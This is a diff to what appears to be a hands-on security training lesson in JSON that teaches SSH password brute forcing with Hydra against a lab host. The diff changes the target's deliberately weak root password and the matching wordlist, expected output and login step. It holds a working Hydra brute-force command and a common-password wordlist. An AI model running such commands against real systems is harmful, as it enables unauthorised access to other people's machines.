@@ -6,7 +6,7 @@
   "ip": "172.20.0.17",
   "port": 22,
   "short_description": "Use Hydra to crack weak SSH passwords.",
-  "description": "Many systems still use weak or default passwords. This lesson teaches you to use Hydra to brute force SSH credentials. The target has an intentionally weak password: root/root.",
+  "description": "Many systems still use weak or default passwords. This lesson teaches you to use Hydra to brute force SSH credentials. The target has username 'root' with a weak password that Hydra will discover.",
   "steps": [
     {
       "title": "Verify SSH is running",
@@ -17,14 +17,14 @@
     },
     {
       "title": "Create a small wordlist",
-      "command": "echo -e 'admin\\npassword\\n123456\\nroot\\ntoor' > /tmp/passwords.txt",
-      "explanation": "For speed, we'll use a tiny wordlist. Real attacks use larger lists like rockyou.txt."
+      "command": "echo -e 'admin\\npassword\\n123456\\nletmein\\npassword123' > /tmp/passwords.txt",
+      "explanation": "For speed, we'll use a tiny wordlist with common passwords. Real attacks use larger lists like rockyou.txt."
     },
     {
       "title": "Run Hydra brute force",
       "command": "hydra -l root -P /tmp/passwords.txt ssh://172.20.0.17 -t 4",
       "explanation": "Hydra tries each password. -l root targets the root user. -t 4 means 4 parallel threads.",
-      "expected": "[22][ssh] host: 172.20.0.17   login: root   password: root",
+      "expected": "[22][ssh] host: 172.20.0.17   login: root   password: password123",
       "duration": "5-15 sec"
     },
     {
@@ -39,8 +39,8 @@
     },
     {
       "title": "Enter password",
-      "command": "root",
-      "explanation": "Type the password we found: root. (No prompt - just type!)"
+      "command": "password123",
+      "explanation": "Type the password Hydra found: password123"
     },
     {
       "title": "Verify root access",
